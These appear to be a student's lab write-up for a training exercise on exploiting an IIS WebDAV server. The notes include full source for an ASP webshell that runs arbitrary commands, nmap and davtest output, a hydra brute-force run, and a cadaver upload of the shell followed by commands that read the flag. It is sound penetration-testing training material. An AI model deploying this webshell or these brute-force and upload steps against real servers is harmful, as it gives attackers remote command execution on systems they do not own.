Your task is to fingerprint the service using the tools available on the Kali machine and exploit using Davtest and Cadaver tools.

[Davtest](https://code.google.com/archive/p/davtest/):

- Davtest is a WebDAV scanner that sends exploit files to the WebDAV server and automatically creates the directory and uploads different format types of files. The tool also tried to execute uploaded files and gives us an output of successfully executed files.

[cadaver](https://github.com/grimneko/cadaver):

- Cadaver is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc.

**Objective:** Exploit the service and retrieve the flag!

The following username and password may be used to access the service:

| Username | Password | | bob | password_123321 |


```
<!--
ASP Webshell
Working on latest IIS 
Referance :- 
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
http://www.w3schools.com/asp/
-->


<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>


<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's local address:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>
</HTML>
```

[[ping]]

```
root@attackdefense:~# ping -c 5 10.5.27.75
PING 10.5.27.75 (10.5.27.75) 56(84) bytes of data.
64 bytes from 10.5.27.75: icmp_seq=1 ttl=125 time=2.50 ms
64 bytes from 10.5.27.75: icmp_seq=2 ttl=125 time=1.67 ms
64 bytes from 10.5.27.75: icmp_seq=3 ttl=125 time=1.67 ms
64 bytes from 10.5.27.75: icmp_seq=4 ttl=125 time=1.63 ms
64 bytes from 10.5.27.75: icmp_seq=5 ttl=125 time=2.27 ms

--- 10.5.27.75 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4007ms
rtt min/avg/max/mdev = 1.627/1.947/2.501/0.366 ms
```

[[Hack2.0/NMAP#General Scan|NMAP basic scan]]

```
root@attackdefense:~# nmap 10.5.27.75
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-14 11:17 IST
Nmap scan report for 10.5.27.75
Host is up (0.0016s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.85 seconds
```

```
root@attackdefense:~# nmap -p80 -sV -sC 10.5.27.75
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-14 11:17 IST
Nmap scan report for 10.5.27.75
Host is up (0.0017s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND LOCK UNLOCK PROPPATCH MKCOL PUT DELETE MOVE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to /Default.aspx
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Server Date: Fri, 14 Jul 2023 05:47:38 GMT
|_  Server Type: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.29 seconds
```

```
root@attackdefense:~# nmap -p80 --script http-enum 10.5.27.75
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-14 11:20 IST
Nmap scan report for 10.5.27.75
Host is up (0.0018s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /webdav/: Potentially interesting folder (401 Unauthorized)

Nmap done: 1 IP address (1 host up) scanned in 5.67 seconds
```

[[davtest#basic command|checking for allowed dirs and all]]

```
root@attackdefense:~# davtest -url http://10.5.27.75/webdav/ -auth bob:password_123321
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.5.27.75/webdav
********************************************************
NOTE	Random string for this session: Rlui7qRU
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.5.27.75/webdav/DavTestDir_Rlui7qRU
********************************************************
 Sending test files
PUT	pl	SUCCEED:	http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.pl
PUT	aspx	SUCCEED:	http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.aspx
PUT	php	SUCCEED:	http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.php
PUT	jsp	SUCCEED:	http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.jsp
PUT	cgi	SUCCEED:	http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.cgi
PUT	txt	SUCCEED:	http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.txt
PUT	cfm	SUCCEED:	http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.cfm
PUT	shtml	SUCCEED:	http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.shtml
PUT	html	SUCCEED:	http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.html
PUT	jhtml	SUCCEED:	http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.jhtml
PUT	asp	SUCCEED:	http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.asp
********************************************************
 Checking for test file execution
EXEC	pl	FAIL
EXEC	aspx	FAIL
EXEC	php	FAIL
EXEC	jsp	FAIL
EXEC	cgi	FAIL
EXEC	txt	SUCCEED:	http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.txt
EXEC	cfm	FAIL
EXEC	shtml	FAIL
EXEC	html	SUCCEED:	http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.html
EXEC	jhtml	FAIL
EXEC	asp	SUCCEED:	http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.asp

********************************************************
/usr/bin/davtest Summary:
Created: http://10.5.27.75/webdav/DavTestDir_Rlui7qRU
PUT File: http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.pl
PUT File: http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.aspx
PUT File: http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.php
PUT File: http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.jsp
PUT File: http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.cgi
PUT File: http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.txt
PUT File: http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.cfm
PUT File: http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.shtml
PUT File: http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.html
PUT File: http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.jhtml
PUT File: http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.asp
Executes: http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.txt
Executes: http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.html
Executes: http://10.5.27.75/webdav/DavTestDir_Rlui7qRU/davtest_Rlui7qRU.asp
```

[[Hack2.0/hydra|hydra]]

```
root@attackdefense:~# hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.5.27.75 http-get /webdav/
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-14 11:27:54
[DATA] max 16 tasks per 1 server, overall 16 tasks, 400 login tries (l:8/p:50), ~25 tries per task
[DATA] attacking http-get://10.5.27.75:80/webdav/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-14 11:27:57
```

[[cadaver]]

```
root@attackdefense:~# cadaver http://10.5.27.75
Could not access / (not WebDAV-enabled?):
401 Unauthorized
Connection to `10.5.27.75' closed.
dav:!> open http://10.5.27.75/webdav/
Authentication required for 10.5.27.75 on server `10.5.27.75':
Username: bob
Password: 
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_Rlui7qRU                    0  Jul 14 11:23
        AttackDefense.txt                     13  Jan  2  2021
        web.config                           168  Jan  2  2021
dav:/webdav/>
```

now we know that we can execute the .asp file we will go ahead and upload the backdoor from /usr/share/webshells/asp/webshell.asp to the webdav folder using cadaver.

```
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp 
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_Rlui7qRU                    0  Jul 14 11:23
        AttackDefense.txt                     13  Jan  2  2021
        web.config                           168  Jan  2  2021
        webshell.asp                        1362  Jul 14 11:37
```

We can confirm the same by logging in the webdav folder. Once you click on the webshell.asp we will be redirected to the page from where we can execute the commands.

![[Pasted image 20230714113844.png]]

![[Pasted image 20230714114104.png]]

```
dir C:\
type C:\flag.txt
```

![[Pasted image 20230714114344.png]]